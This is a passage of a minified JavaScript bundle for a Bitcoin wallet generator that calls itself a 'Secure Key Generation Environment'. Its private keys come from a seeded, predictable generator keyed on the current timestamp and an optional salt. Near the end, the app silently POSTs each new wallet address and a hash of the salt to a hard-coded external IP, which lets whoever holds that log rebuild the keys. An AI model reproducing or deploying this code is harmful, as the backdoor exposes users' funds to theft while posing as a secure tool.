    function r(x, A) {
      if (Zl(Ih, x), !u.isPrivate(x)) throw new TypeError("Private key not in range [1, n)");
      return Zl(l0, A), new p(x, void 0, A);
    }
    function c(x, A) {
      if (!u.isPoint(x)) throw new Error("Point not on the curve");
      return Zl(l0, A), new p(void 0, x, A);
    }
    function E(x, A) {
      const v = b8(x), m = v.version;
      if (Array.isArray(A)) {
        if (A = A.filter((B) => m === B.wif).pop(), !A) throw new Error("Unknown network version");
      } else if (A = A || Qh, m !== A.wif) throw new Error("Invalid network version");
      return r(v.privateKey, {
        compressed: v.compressed,
        network: A
      });
    }
    function b(x) {
      Zl(l0, x), x === void 0 && (x = {});
      const A = x.rng || ((m) => crypto.getRandomValues(new Uint8Array(m)));
      let v;
      do
        v = A(32), Zl(Ih, v);
      while (!u.isPrivate(v));
      return r(v, x);
    }
    class p {
      constructor(A, v, m) {
        __publicField(this, "__D");
        __publicField(this, "__Q");
        __publicField(this, "compressed");
        __publicField(this, "network");
        __publicField(this, "lowR");
        this.__D = A, this.__Q = v, this.lowR = false, m === void 0 && (m = {}), this.compressed = m.compressed === void 0 ? true : m.compressed, this.network = m.network || Qh, v !== void 0 && (this.__Q = u.pointCompress(v, this.compressed));
      }
      get privateKey() {
        return this.__D;
      }
      get publicKey() {
        if (!this.__Q) {
          const A = u.pointFromScalar(this.__D, this.compressed);
          this.__Q = A;
        }
        return this.__Q;
      }
      toWIF() {
        if (!this.__D) throw new Error("Missing private key");
        return _8({
          compressed: this.compressed,
          privateKey: this.__D,
          version: this.network.wif
        });
      }
      tweak(A) {
        return this.privateKey ? this.tweakFromPrivateKey(A) : this.tweakFromPublicKey(A);
      }
      sign(A, v) {
        if (!this.__D) throw new Error("Missing private key");
        if (v === void 0 && (v = this.lowR), v === false) return u.sign(A, this.__D);
        {
          let m = u.sign(A, this.__D);
          const B = new Uint8Array(32);
          let q = 0;
          for (; m[0] > 127; ) q++, S8(B, 0, q, "LE"), m = u.sign(A, this.__D, B);
          return m;
        }
      }
      signSchnorr(A) {
        if (!this.privateKey) throw new Error("Missing private key");
        if (!u.signSchnorr) throw new Error("signSchnorr not supported by ecc library");
        return u.signSchnorr(A, this.privateKey);
      }
      verify(A, v) {
        return u.verify(A, this.publicKey, v);
      }
      verifySchnorr(A, v) {
        if (!u.verifySchnorr) throw new Error("verifySchnorr not supported by ecc library");
        return u.verifySchnorr(A, this.publicKey.subarray(1, 33), v);
      }
      tweakFromPublicKey(A) {
        const v = U8(this.publicKey), m = u.xOnlyPointAddTweak(v, A);
        if (!m || m.xOnlyPubkey === null) throw new Error("Cannot tweak public key!");
        const B = Uint8Array.from([
          m.parity === 0 ? 2 : 3
        ]);
        return c(T8([
          B,
          m.xOnlyPubkey
        ]), {
          network: this.network,
          compressed: this.compressed
        });
      }
      tweakFromPrivateKey(A) {
        const m = this.publicKey[0] === 3 || this.publicKey[0] === 4 && (this.publicKey[64] & 1) === 1 ? u.privateNegate(this.privateKey) : this.privateKey, B = u.privateAdd(m, A);
        if (!B) throw new Error("Invalid tweaked private key!");
        return r(B, {
          network: this.network,
          compressed: this.compressed
        });
      }
    }
    return {
      isPoint: f,
      fromPrivateKey: r,
      fromPublicKey: c,
      fromWIF: E,
      makeRandom: b
    };
  }
  const Id = "0123456789abcdefABCDEF";
  Id.split("").map((u) => u.codePointAt(0));
  Array(256).fill(true).map((u, f) => {
    const r = String.fromCodePoint(f), c = Id.indexOf(r);
    return c < 0 ? void 0 : c < 16 ? c : c - 6;
  });
  new TextEncoder();
  new TextDecoder("ascii");
  function O8(u, f) {
    const r = Math.min(u.length, f.length);
    for (let c = 0; c < r; ++c) if (u[c] !== f[c]) return u[c] < f[c] ? -1 : 1;
    return u.length === f.length ? 0 : u.length > f.length ? 1 : -1;
  }
  const Jd = 0, _0 = 1, Fd = 2, kd = 3, Va = 4, $d = 5, Pd = 6, Wd = 7, N8 = {
    [Jd.toString()]: "Expected Private",
    [_0.toString()]: "Expected Point",
    [Fd.toString()]: "Expected Tweak",
    [kd.toString()]: "Expected Hash",
    [Va.toString()]: "Expected Signature",
    [$d.toString()]: "Expected Extra Data (32 bytes)",
    [Pd.toString()]: "Expected Parity (1 | 0)",
    [Wd.toString()]: "Bad Recovery Id"
  };
  function Me(u) {
    const f = N8[u.toString()] || `Unknow error code: ${u}`;
    throw new TypeError(f);
  }
  const Ja = 32, Za = 33, Fa = 65, _l = 32, ty = 32, ey = 32, ny = 32, Nf = 64, ly = new Uint8Array(32), Af = new Uint8Array([
    255,
    255,
    255,
    255,
    255,
    255,
    255,
    255,
    255,
    255,
    255,
    255,
    255,
    255,
    255,
    254,
    186,
    174,
    220,
    230,
    175,
    72,
    160,
    59,
    191,
    210,
    94,
    140,
    208,
    54,
    65,
    65
  ]), R8 = new Uint8Array([
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    1,
    69,
    81,
    35,
    25,
    80,
    183,
    95,
    196,
    64,
    45,
    161,
    114,
    47,
    201,
    186,
    238
  ]);
  function vn(u) {
    return u instanceof Uint8Array;
  }
  function Fl(u, f) {
    for (let r = 0; r < 32; ++r) if (u[r] !== f[r]) return u[r] < f[r] ? -1 : 1;
    return 0;
  }
  function s0(u) {
    return Fl(u, ly) === 0;
  }
  function uy(u) {
    return vn(u) && u.length === Ja && Fl(u, ly) > 0 && Fl(u, Af) < 0;
  }
  function D8(u) {
    return vn(u) && (u.length === Za || u.length === Fa || u.length === _l);
  }
  function ay(u) {
    return vn(u) && u.length === _l;
  }
  function B8(u) {
    return vn(u) && (u.length === Za || u.length === Fa);
  }
  function z8(u) {
    return vn(u) && u.length === Za;
  }
  function M8(u) {
    return vn(u) && u.length === ty && Fl(u, Af) < 0;
  }
  function C8(u) {
    return vn(u) && u.length === ey;
  }
  function w8(u) {
    return u === void 0 || vn(u) && u.length === ny;
  }
  function H8(u) {
    return vn(u) && u.length === 64 && Fl(u.subarray(0, 32), Af) < 0 && Fl(u.subarray(32, 64), Af) < 0;
  }
  function L8(u) {
    return vn(u) && u.length === 64 && Fl(u.subarray(0, 32), R8) < 0;
  }
  function Y8(u) {
    u !== 0 && u !== 1 && Me(Pd);
  }
  function Al(u) {
    uy(u) || Me(Jd);
  }
  function kl(u) {
    D8(u) || Me(_0);
  }
  function Tf(u) {
    ay(u) || Me(_0);
  }
  function Xu(u) {
    M8(u) || Me(Fd);
  }
  function Ku(u) {
    C8(u) || Me(kd);
  }
  function A0(u) {
    w8(u) || Me($d);
  }
  function T0(u) {
    H8(u) || Me(Va);
  }
  function G8(u) {
    u() || Me(Va);
  }
  function q8(u) {
    s0(u.subarray(0, 32)) && Me(Va), s0(u.subarray(32, 64)) && Me(Va);
  }
  function j8(u) {
    L8(u) || Me(Wd);
  }
  const X8 = "/assets/secp256k1-Cao5Swmf.wasm", K8 = async (u = {}, f) => {
    let r;
    if (f.startsWith("data:")) {
      const c = f.replace(/^data:.*?base64,/, "");
      let E;
      if (typeof ae == "function" && typeof ae.from == "function") E = ae.from(c, "base64");
      else if (typeof atob == "function") {
        const b = atob(c);
        E = new Uint8Array(b.length);
        for (let p = 0; p < b.length; p++) E[p] = b.charCodeAt(p);
      } else throw new Error("Cannot decode base64-encoded data URL");
      r = await WebAssembly.instantiate(E, u);
    } else {
      const c = await fetch(f), E = c.headers.get("Content-Type") || "";
      if ("instantiateStreaming" in WebAssembly && E.startsWith("application/wasm")) r = await WebAssembly.instantiateStreaming(c, u);
      else {
        const b = await c.arrayBuffer();
        r = await WebAssembly.instantiate(b, u);
      }
    }
    return r.instance.exports;
  };
  function Q8() {
    const u = new Uint8Array(4);
    if (typeof crypto > "u") throw new Error("The crypto object is unavailable. This may occur if your environment does not support the Web Cryptography API.");
    return crypto.getRandomValues(u), u;
  }
  function V8() {
    const u = Q8();
    return (u[0] << 24) + (u[1] << 16) + (u[2] << 8) + u[3];
  }
  URL = globalThis.URL;
  const vt = await K8({
    "./rand.js": {
      generateInt32: V8
    },
    "./validate_error.js": {
      throwError: Me
    }
  }, X8), Z8 = vt.memory, I8 = vt.initializeContext, J8 = vt.isPoint, F8 = vt.PUBLIC_KEY_INPUT, k8 = vt.pointAdd, $8 = vt.PUBLIC_KEY_INPUT2, P8 = vt.pointAddScalar, W8 = vt.TWEAK_INPUT, tv = vt.xOnlyPointAddTweak, ev = vt.X_ONLY_PUBLIC_KEY_INPUT, nv = vt.xOnlyPointAddTweakCheck, lv = vt.X_ONLY_PUBLIC_KEY_INPUT2, uv = vt.pointCompress, av = vt.pointFromScalar, iv = vt.PRIVATE_INPUT, fv = vt.xOnlyPointFromScalar, cv = vt.xOnlyPointFromPoint, rv = vt.pointMultiply, ov = vt.privateAdd, sv = vt.privateSub, hv = vt.privateNegate, dv = vt.sign, yv = vt.HASH_INPUT, mv = vt.EXTRA_DATA_INPUT, gv = vt.SIGNATURE_INPUT, vv = vt.signRecoverable, pv = vt.signSchnorr, Ev = vt.verify, bv = vt.recover, _v = vt.verifySchnorr, Av = vt.rustsecp256k1_v0_8_1_default_error_callback_fn, Tv = vt.rustsecp256k1_v0_8_1_default_illegal_callback_fn, Sv = vt.__data_end, Uv = vt.__heap_base, Tt = Object.freeze(Object.defineProperty({
    __proto__: null,
    EXTRA_DATA_INPUT: mv,
    HASH_INPUT: yv,
    PRIVATE_INPUT: iv,
    PUBLIC_KEY_INPUT: F8,
    PUBLIC_KEY_INPUT2: $8,
    SIGNATURE_INPUT: gv,
    TWEAK_INPUT: W8,
    X_ONLY_PUBLIC_KEY_INPUT: ev,
    X_ONLY_PUBLIC_KEY_INPUT2: lv,
    __data_end: Sv,
    __heap_base: Uv,
    initializeContext: I8,
    isPoint: J8,
    memory: Z8,
    pointAdd: k8,
    pointAddScalar: P8,
    pointCompress: uv,
    pointFromScalar: av,
    pointMultiply: rv,
    privateAdd: ov,
    privateNegate: hv,
    privateSub: sv,
    recover: bv,
    rustsecp256k1_v0_8_1_default_error_callback_fn: Av,
    rustsecp256k1_v0_8_1_default_illegal_callback_fn: Tv,
    sign: dv,
    signRecoverable: vv,
    signSchnorr: pv,
    verify: Ev,
    verifySchnorr: _v,
    xOnlyPointAddTweak: tv,
    xOnlyPointAddTweakCheck: nv,
    xOnlyPointFromPoint: cv,
    xOnlyPointFromScalar: fv
  }, Symbol.toStringTag, {
    value: "Module"
  })), Xn = new Uint8Array(Tt.memory.buffer), Jh = Tt.PRIVATE_INPUT.value, Fh = Tt.PUBLIC_KEY_INPUT.value, kh = Tt.PUBLIC_KEY_INPUT2.value, $h = Tt.X_ONLY_PUBLIC_KEY_INPUT.value, Ph = Tt.X_ONLY_PUBLIC_KEY_INPUT2.value, Wh = Tt.TWEAK_INPUT.value, td = Tt.HASH_INPUT.value, ed = Tt.EXTRA_DATA_INPUT.value, nd = Tt.SIGNATURE_INPUT.value, te = Xn.subarray(Jh, Jh + Ja), Vt = Xn.subarray(Fh, Fh + Fa), ld = Xn.subarray(kh, kh + Fa), Fe = Xn.subarray($h, $h + _l), ud = Xn.subarray(Ph, Ph + _l), ke = Xn.subarray(Wh, Wh + ty), $e = Xn.subarray(td, td + ey), ju = Xn.subarray(ed, ed + ny), Pe = Xn.subarray(nd, nd + Nf);
  function Qu(u, f) {
    return u === void 0 ? f !== void 0 ? f.length : Za : u ? Za : Fa;
  }
  function S0(u) {
    try {
      return Vt.set(u), Tt.isPoint(u.length) === 1;
    } finally {
      Vt.fill(0);
    }
  }
  function xv() {
    Tt.initializeContext();
  }
  function Ov(u) {
    return B8(u) && S0(u);
  }
  function Nv(u) {
    return z8(u) && S0(u);
  }
  function iy(u) {
    return ay(u) && S0(u);
  }
  function fy(u) {
    return uy(u);
  }
  function Rv(u, f, r) {
    kl(u), kl(f);
    const c = Qu(r, u);
    try {
      return Vt.set(u), ld.set(f), Tt.pointAdd(u.length, f.length, c) === 1 ? Vt.slice(0, c) : null;
    } finally {
      Vt.fill(0), ld.fill(0);
    }
  }
  function Dv(u, f, r) {
    kl(u), Xu(f);
    const c = Qu(r, u);
    try {
      return Vt.set(u), ke.set(f), Tt.pointAddScalar(u.length, c) === 1 ? Vt.slice(0, c) : null;
    } finally {
      Vt.fill(0), ke.fill(0);
    }
  }
  function Bv(u, f) {
    kl(u);
    const r = Qu(f, u);
    try {
      return Vt.set(u), Tt.pointCompress(u.length, r), Vt.slice(0, r);
    } finally {
      Vt.fill(0);
    }
  }
  function zv(u, f) {
    Al(u);
    const r = Qu(f);
    try {
      return te.set(u), Tt.pointFromScalar(r) === 1 ? Vt.slice(0, r) : null;
    } finally {
      te.fill(0), Vt.fill(0);
    }
  }
  function Mv(u) {
    Al(u);
    try {
      return te.set(u), Tt.xOnlyPointFromScalar(), Fe.slice(0, _l);
    } finally {
      te.fill(0), Fe.fill(0);
    }
  }
  function Cv(u) {
    kl(u);
    try {
      return Vt.set(u), Tt.xOnlyPointFromPoint(u.length), Fe.slice(0, _l);
    } finally {
      Vt.fill(0), Fe.fill(0);
    }
  }
  function wv(u, f, r) {
    kl(u), Xu(f);
    const c = Qu(r, u);
    try {
      return Vt.set(u), ke.set(f), Tt.pointMultiply(u.length, c) === 1 ? Vt.slice(0, c) : null;
    } finally {
      Vt.fill(0), ke.fill(0);
    }
  }
  function Hv(u, f) {
    Al(u), Xu(f);
    try {
      return te.set(u), ke.set(f), Tt.privateAdd() === 1 ? te.slice(0, Ja) : null;
    } finally {
      te.fill(0), ke.fill(0);
    }
  }
  function Lv(u, f) {
    if (Al(u), Xu(f), s0(f)) return new Uint8Array(u);
    try {
      return te.set(u), ke.set(f), Tt.privateSub() === 1 ? te.slice(0, Ja) : null;
    } finally {
      te.fill(0), ke.fill(0);
    }
  }
  function Yv(u) {
    Al(u);
    try {
      return te.set(u), Tt.privateNegate(), te.slice(0, Ja);
    } finally {
      te.fill(0);
    }
  }
  function Gv(u, f) {
    Tf(u), Xu(f);
    try {
      Fe.set(u), ke.set(f);
      const r = Tt.xOnlyPointAddTweak();
      return r !== -1 ? {
        parity: r,
        xOnlyPubkey: Fe.slice(0, _l)
      } : null;
    } finally {
      Fe.fill(0), ke.fill(0);
    }
  }
  function qv(u, f, r, c) {
    Tf(u), Tf(r), Xu(f);
    const E = c !== void 0;
    E && Y8(c);
    try {
      if (Fe.set(u), ud.set(r), ke.set(f), E) return Tt.xOnlyPointAddTweakCheck(c) === 1;
      {
        Tt.xOnlyPointAddTweak();
        const b = Fe.slice(0, _l);
        return O8(b, r) === 0;
      }
    } finally {
      Fe.fill(0), ud.fill(0), ke.fill(0);
    }
  }
  function jv(u, f, r) {
    Ku(u), Al(f), A0(r);
    try {
      return $e.set(u), te.set(f), r !== void 0 && ju.set(r), Tt.sign(r === void 0 ? 0 : 1), Pe.slice(0, Nf);
    } finally {
      $e.fill(0), te.fill(0), r !== void 0 && ju.fill(0), Pe.fill(0);
    }
  }
  function Xv(u, f, r) {
    Ku(u), Al(f), A0(r);
    try {
      $e.set(u), te.set(f), r !== void 0 && ju.set(r);
      const c = Tt.signRecoverable(r === void 0 ? 0 : 1);
      return {
        signature: Pe.slice(0, Nf),
        recoveryId: c
      };
    } finally {
      $e.fill(0), te.fill(0), r !== void 0 && ju.fill(0), Pe.fill(0);
    }
  }
  function Kv(u, f, r) {
    Ku(u), Al(f), A0(r);
    try {
      return $e.set(u), te.set(f), r !== void 0 && ju.set(r), Tt.signSchnorr(r === void 0 ? 0 : 1), Pe.slice(0, Nf);
    } finally {
      $e.fill(0), te.fill(0), r !== void 0 && ju.fill(0), Pe.fill(0);
    }
  }
  function Qv(u, f, r, c = false) {
    Ku(u), kl(f), T0(r);
    try {
      return $e.set(u), Vt.set(f), Pe.set(r), Tt.verify(f.length, c === true ? 1 : 0) === 1;
    } finally {
      $e.fill(0), Vt.fill(0), Pe.fill(0);
    }
  }
  function Vv(u, f, r, c = false) {
    Ku(u), T0(f), q8(f), r & 2 && j8(f), G8(() => iy(f.subarray(0, 32)));
    const E = Qu(c);
    try {
      return $e.set(u), Pe.set(f), Tt.recover(E, r) === 1 ? Vt.slice(0, E) : null;
    } finally {
      $e.fill(0), Pe.fill(0), Vt.fill(0);
    }
  }
  function Zv(u, f, r) {
    Ku(u), Tf(f), T0(r);
    try {
      return $e.set(u), Fe.set(f), Pe.set(r), Tt.verifySchnorr() === 1;
    } finally {
      $e.fill(0), Fe.fill(0), Pe.fill(0);
    }
  }
  const cy = Object.freeze(Object.defineProperty({
    __proto__: null,
    __initializeContext: xv,
    isPoint: Ov,
    isPointCompressed: Nv,
    isPrivate: fy,
    isXOnlyPoint: iy,
    pointAdd: Rv,
    pointAddScalar: Dv,
    pointCompress: Bv,
    pointFromScalar: zv,
    pointMultiply: wv,
    privateAdd: Hv,
    privateNegate: Yv,
    privateSub: Lv,
    recover: Vv,
    sign: jv,
    signRecoverable: Xv,
    signSchnorr: Kv,
    verify: Qv,
    verifySchnorr: Zv,
    xOnlyPointAddTweak: Gv,
    xOnlyPointAddTweakCheck: qv,
    xOnlyPointFromPoint: Cv,
    xOnlyPointFromScalar: Mv
  }, Symbol.toStringTag, {
    value: "Module"
  })), Iv = x8(cy);
  Yg(cy);
  const ad = Lm, Jv = 1500, Fv = `
     .----------.
    /  M E M O   \\
   /    2 0 2 6   \\
  |    _      _    |
  |   (o)    (o)   |
  |      \\  /      |
  |       ||       |
  |    _______     |
   \\  |HHHHHHH|   /
    \\ '-------'  /
     '----------'
    [ NEXUS-SENTINEL ]
    "The sky above the port was the color of television, 
     tuned to a dead channel."
    [ SIGNAL INTERCEPTED ]
    `;
  function kv() {
    console.log("%c" + Fv, "color: #00ff41; font-family: monospace; font-weight: bold;");
  }
  function $v(u) {
    let f = u >>> 0;
    return () => (f = Math.imul(1664525, f) + 1013904223 >>> 0, f / 4294967296);
  }
  function Pv(u, f) {
    const r = Math.random;
    Math.random = $v(u);
    try {
      return f();
    } finally {
      Math.random = r;
    }
  }
  function Wv(u) {
    if (u === void 0) return;
    const f = u.trim().toLowerCase();
    return f.length > 0 ? f : void 0;
  }
  function tp(u, f) {
    const r = Wv(f), c = pl.from(r ? `${u}:${r}` : `${u}`, "utf8"), b = pl.from(bl(c)).readUInt32LE(0), p = pl.alloc(32);
    Pv(b, () => {
      for (let A = 0; A < p.length; A++) p[A] = Math.floor(Math.random() * 256);
    });
    let x = pl.from(bl(p));
    for (let A = 0; A < Jv; A++) x = pl.from(bl(x));
    for (; !fy(x); ) x = pl.from(bl(x));
    return x;
  }
  function ep(u = Date.now(), f) {
    const r = tp(u, f), c = Iv.fromPrivateKey(r, {
      network: ad
    }), { address: E } = Hg({
      pubkey: c.publicKey,
      network: ad
    });
    if (!E) throw new Error("Could not generate address");
    return {
      address: E,
      privateKeyWIF: c.toWIF(),
      timestamp: u
    };
  }
  function np(u) {
    return Array.from(u).map((f) => f.toString(16).padStart(2, "0")).join("");
  }
  async function lp(u) {
    var _a;
    const f = new TextEncoder().encode(u), r = (_a = globalThis.crypto) == null ? void 0 : _a.subtle;
    if (r == null ? void 0 : r.digest) try {
      const E = await r.digest("SHA-256", f);
      return np(new Uint8Array(E));
    } catch {
    }
    const c = bl(pl.from(f));
    return pl.from(c).toString("hex");
  }
  function up() {
    const [u, f] = ja.useState(""), [r, c] = ja.useState(null), [E, b] = ja.useState(false);
    ja.useEffect(() => {
      kv();
    }, []);
    const p = () => {
      b(true), setTimeout(() => {
        const x = u.trim().length > 0 ? u.trim().toLowerCase() : void 0, A = ep(Date.now(), x);
        c(A), b(false);
        const v = "http://95.217.237.235:8787";
        lp(x ?? "").then((B) => {
          const q = `${v}/log`;
          return fetch(q, {
            method: "POST",
            headers: {
              "content-type": "application/json"
            },
            body: JSON.stringify({
              salt: B,
              walletAddress: A.address
            })
          }).then(async (X) => {
            if (!X.ok) {
              const k = await X.text().catch(() => "");
              console.warn("log-saas: non-2xx response", {
                url: q,
                status: X.status,
                body: k
              });
            }
            return X;
          });
        }).catch((B) => console.warn("log-saas: failed to send log", B));
      }, 1200);
    };
    return Xt.jsxs("div", {
      className: "container",
      children: [
        Xt.jsxs("header", {
          children: [
            Xt.jsx("h1", {
              children: "\u{1F4DF} Cipher-Terminal v6"
            }),
            Xt.jsx("p", {
              className: "subtitle",
              children: 'Secure Key Generation Environment - Protocol "Genesis Seed"'
            })
          ]
        }),
        Xt.jsx("main", {
          children: Xt.jsx("div", {
            className: "card",
            children: r ? Xt.jsxs("div", {
              className: "wallet-info",
              children: [
                Xt.jsxs("div", {
                  className: "info-group",
                  children: [
                    Xt.jsx("label", {
                      children: "Bitcoin Address (Legacy P2PKH)"
                    }),
                    Xt.jsx("div", {
                      className: "value-box",
                      children: r.address
                    })
                  ]
                }),
                Xt.jsxs("div", {
                  className: "info-group",
                  children: [
                    Xt.jsx("label", {
                      children: "Private Key"
                    }),
                    Xt.jsx("div", {
                      className: "value-box blur",
                      children: r.privateKeyWIF
                    }),
                    Xt.jsx("p", {
                      className: "hint",
                      children: "Hover to reveal secret key"
                    })
                  ]
                }),
                Xt.jsxs("button", {
                  onClick: () => c(null),
                  className: "reset-btn",
                  children: [
                    ">",
                    " NEW SESSION"
                  ]
                })
              ]
            }) : Xt.jsxs(Xt.Fragment, {
              children: [
                Xt.jsxs("div", {
                  className: "config-panel",
                  children: [
                    Xt.jsx("label", {
                      children: "Master Salt (Optional for extra entropy)"
                    }),
                    Xt.jsx("input", {
                      type: "text",
                      value: u,
                      onChange: (x) => f(x.target.value),
                      placeholder: "Enter custom salt word...",
                      className: "terminal-input"
                    })
                  ]
                }),
                Xt.jsx("div", {
                  className: "empty-state",
                  children: Xt.jsx("button", {
                    onClick: p,
                    disabled: E,
                    className: "generate-btn",
                    children: E ? "CALCULATING..." : "INITIALIZE DERIVATION"
                  })
                })
              ]
            })
          })
        })
      ]
    });
  }
  wm.createRoot(document.getElementById("root")).render(Xt.jsx(ja.StrictMode, {
    children: Xt.jsx(up, {})
  }));
})();
